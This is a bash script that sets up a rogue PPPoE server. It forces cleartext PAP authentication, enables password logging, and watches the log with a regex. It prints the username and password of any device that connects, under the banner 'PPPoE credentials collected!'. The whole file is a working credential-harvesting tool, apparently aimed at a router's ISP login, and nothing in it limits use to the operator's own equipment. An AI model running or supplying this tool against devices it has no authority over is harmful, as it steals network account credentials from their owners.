#!/bin/bash

pkill pppoe-server 2>/dev/null

rm -f /etc/ppp/pppoe-server-options
rm -f /etc/ppp/options

printf "\"fiber@fiber\"   *   \"fiber\"   *\n" > /etc/ppp/pap-secrets
printf "\"fiber@fiber\"   *   \"fiber\"   *\n" > /etc/ppp/chap-secrets

cat <<EOF > /etc/ppp/pppoe-server-options
ms-dns 10.116.13.1
require-pap
lcp-echo-interval 10
lcp-echo-failure 2
EOF

# pppd options
cat <<EOF > /etc/ppp/options
asyncmap 0
auth
crtscts
lock
show-password
modem
-chap
+pap
lcp-echo-interval 30
lcp-echo-failure 4
noipx
debug
logfile /var/log/pppoe-server-log
EOF

# Ethernet interface (you may need to change the interface: eth0 / enp3s0 etc.)
IFACE="eth0"

echo "[*] Starting PPPoE server..."
pppoe-server -I $IFACE -L 10.116.13.1 -R 10.116.13.100 -N 100 &
sleep 1
echo "[*] Starting log monitoring..."
echo "" > /var/log/pppoe-server-log

tail -f /var/log/pppoe-server-log | while read line; do
    if [[ "$line" =~ rcvd\ \[PAP\ AuthReq.*user=\"([^\"]+)\".*password=\"([^\"]+)\" ]]; then
        user="${BASH_REMATCH[1]}"
        password="${BASH_REMATCH[2]}"
        echo "=============================="
        echo "PPPoE credentials collected!"
        echo "Username: $user"
        echo "Password: $password"
        echo "=============================="
        pkill pppoe-server
        exit 0
    fi
done
